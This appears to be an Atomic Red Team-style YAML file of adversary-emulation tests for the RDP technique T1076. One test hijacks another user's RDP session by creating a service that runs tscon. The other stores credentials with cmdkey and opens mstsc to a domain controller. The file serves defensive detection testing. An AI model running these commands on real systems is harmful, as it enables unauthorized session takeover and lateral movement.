---
attack_technique: T1076
display_name: Remote Desktop Protocol

atomic_tests:
- name: RDP hijacking
  auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
  description: |
    RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization
  supported_platforms:
    - windows
  input_arguments:
    Session_ID:
      description: The ID of the session to which you want to connect
      type: String
      default: 1337
    Destination_ID:
      description: Connect the session of another user to a different session
      type: String
      default: rdp-tcp#55
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      query user
      sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
      net start sesshijack
    cleanup_command: |
      sc.exe delete sesshijack >nul 2>&1

- name: RDPto-DomainController
  auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
  description: |
    Attempt an RDP session via Remote Desktop Application to a DomainController.
  supported_platforms:
  - windows
  input_arguments:
    logonserver:
      description: ComputerName
      type: String
      default: WIN-DC
    username:
      description: Username
      type: String
      default: Administrator
    password:
      description: Password
      type: String
      default: I-l1ke-Attack-Range!
  dependencies:
  - description: |
      Computer must be domain joined
    prereq_command: |
      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}
    get_prereq_command: |
      Write-Host Joining this computer to a domain must be done manually
  executor:
    command: |
      $Server="#{logonserver}"
      $User="#{username}"
      $Password="#{password}"
      cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
      mstsc /v:$Server
      echo "RDP connection established"
    cleanup_command: |
      $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
      if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
    name: powershell
